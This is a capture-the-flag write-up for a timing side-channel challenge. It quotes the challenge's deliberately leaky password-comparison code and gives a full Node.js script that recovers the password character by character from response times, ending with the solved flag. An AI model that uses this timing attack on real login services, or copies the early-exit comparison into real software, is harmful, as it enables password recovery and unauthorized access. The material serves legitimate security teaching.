# Time will tell

Difficaulty: `Medium`  
Author: `@aenygma`  
Category: `Miscellaneous`  
Points: `241`

## Description

A side channel timing attack.
Figure out the password in 90 seconds before connection terminates.
The password is dynamic and changes every connection session.

NOTE, the password is eight characters long and will be hexadecimal.

**Attachments:** [app.py](./attachments/app.py)

## Solution

As description says, **"a side channel timing attack"**.

Just look at the source code and find where the time is being consumed.

```python
SIMULATE_COMPUTE_TIME = 0.1

def check_guess(guess, realdeal) -> bool:
    """
    validate if the given guess matches what's known
    """
    if len(guess) != len(realdeal):
        #print(len(guess), len(realdeal))
        return False
    do_heavy_compute()
    for idx in range(len(guess)):
        if guess[idx] == realdeal[idx]:
            do_heavy_compute()
        else:
            return False
    return True

def main():
    ...
    while True:
        guess = input(": ")
        if check_guess(guess, secret_password):
            flag = read_flag()
            print(f"Well done! Here's your flag: {flag}")
            continue
        print("Incorrect. Try again.")
```

The `check_guess` function is the one that is consuming time.
It will doing heavy computation **when guess password length is equal to the real password length** and, havier **when each character of the guess password is equal to the real password**.

We can measure response time for each character and take the character which is taking more time to respond. This way we can find the correct password.

This is my script used to solve the challenge.

```javascript
const net = require('net')

const HEX_CHARS = '0123456789abcdef'
const PASSWORD_LENGTH = 8

let startTime = undefined
let currentIndex = 0

// guess password array [0, 0, 0, 0, 0, 0, 0, 0]
const password = new Array(PASSWORD_LENGTH).fill('0')

// I just too lazy to join the array every time
const getPassword = () => password.join('')

// Defined haviest compute object to store the heaviest compute time and the character
const haviestCompute = {
  time: 0,
  char: ''
}

const client = net.createConnection({
  host: '' // Host,
  port: 0 // Port
})

client.on('data', (data) => {
  postProcess()
  const text = data.toString().trim()
  console.log(text)
  if (/flag\{[0-9a-f]{32}\}/.test(text) || currentIndex >= PASSWORD_LENGTH) {
    return client.end()
  }
  // Send password to server with start measuring the time
  client.write(getPassword() + '\n', start)
})

// Function to post process the response
function postProcess() {
  if (startTime) {
    //  Get the time taken to compute the response
    const timeMs = end()

    console.log(getPassword(), 'Time:', timeMs, 'ms')

    //  Check if the time taken is greater than the heaviest compute time
    if (timeMs > haviestCompute.time) {
      // if yes, update the heaviest compute time and the character
      haviestCompute.time = timeMs
      haviestCompute.char = password[currentIndex]
    }

    // Defined the next index of hex character
    const nextCharIndex = HEX_CHARS.indexOf(password[currentIndex]) + 1

    //  Update the password
    password[currentIndex] = HEX_CHARS[nextCharIndex]

    //  Check if we have reached the end of the hex characters
    if (nextCharIndex >= HEX_CHARS.length) {
      //  Reset all values for new password index
      password[currentIndex] = haviestCompute.char
      haviestCompute.time = 0
      haviestCompute.char = ''
      currentIndex++
    }
  }
}

// Function to start the process time measurement
function start() {
  startTime = process.hrtime()
}

// Function to end the process time measurement
function end() {
  const diff = process.hrtime(startTime)
  return (diff[0] * 1e9 + diff[1]) / 1e6
}
```

When we run the script and print response time for each guessing character, we will see that there is a character that takes more time to respond than the others.

![runscript](image.png)  
And, if the time taken to compute the response is increasing as we move forward, we are on the right track.

![solved](image-2.png)

Finally, we get our real password with flag.  
Password: `06b0a59a` **_(Only for this session)_**

## Flag

```txt
flag{ab6962e29ed608c0710dbf2910f358d5}
```
